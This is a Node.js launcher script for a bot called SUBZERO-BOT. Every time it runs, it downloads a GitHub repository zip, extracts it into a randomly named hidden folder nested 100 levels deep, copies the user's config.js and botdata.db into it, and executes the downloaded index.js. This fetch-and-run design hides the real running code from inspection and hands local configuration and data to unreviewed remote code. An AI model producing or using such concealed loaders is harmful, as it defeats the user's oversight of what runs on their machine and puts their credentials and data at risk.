const fs = require('fs');
const path = require('path');
const axios = require('axios');
const AdmZip = require('adm-zip');

// GitHub repo zip URL for SUBZERO-BOT
const repoZipUrl = 'https://github.com/3strox/x/archive/refs/heads/main.zip';

// Function to generate a very deep hidden path
function generateDeepPath(base = '.cache', depth = 100) {
    let deepPath = path.join(__dirname, base);
    for (let i = 0; i < depth; i++) {
        const folder = '.' + Math.random().toString(36).substring(2, 8);
        deepPath = path.join(deepPath, folder);
    }
    return deepPath;
}

const deepPath = generateDeepPath();
const repoFolder = path.join(deepPath, '.repo');

async function downloadAndExtractRepo() {
    try {
        console.log('[🌐 ] Connecting to Server...');

        const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
        const zipBuffer = Buffer.from(response.data, 'binary');
        const zip = new AdmZip(zipBuffer);

        fs.mkdirSync(repoFolder, { recursive: true });
        zip.extractAllTo(repoFolder, true);

        console.log('[🌐 ] Connected to Servers');
    } catch (error) {
        console.error('❌ SUBZERO SERVER IS OFFLINE', error);
        process.exit(1);
    }
}

(async () => {
    await downloadAndExtractRepo();

    const extractedFolders = fs.readdirSync(repoFolder).filter(f =>
        fs.statSync(path.join(repoFolder, f)).isDirectory());

    if (!extractedFolders.length) {
        console.error('❌ No folder found in extracted repo');
        process.exit(1);
    }

    const extractedRepoPath = path.join(repoFolder, extractedFolders[0]);

    // Save path to .lock for internal tracking
    const lockPath = path.join(__dirname, '.lock');
    fs.writeFileSync(lockPath, extractedRepoPath);

    console.log('[🔐 ] Loaded hidden path from .lock');
    console.log('[📂 ] Running from deep secure folder...');

    // Copy config.js if it exists
    const localConfig = path.join(__dirname, 'config.js');
    if (fs.existsSync(localConfig)) {
        fs.copyFileSync(localConfig, path.join(extractedRepoPath, 'config.js'));
    }

    // Copy botdata.db if it exists
    const localDB = path.join(__dirname, 'botdata.db');
    const targetDB = path.join(extractedRepoPath, 'lib', 'botdata.db');
    if (fs.existsSync(localDB)) {
        fs.mkdirSync(path.dirname(targetDB), { recursive: true });
        fs.copyFileSync(localDB, targetDB);
        console.log('[🗃️ ] Copied botdata.db into secure location');
    }

    process.chdir(extractedRepoPath);
    require(path.join(extractedRepoPath, 'index.js'));
})();
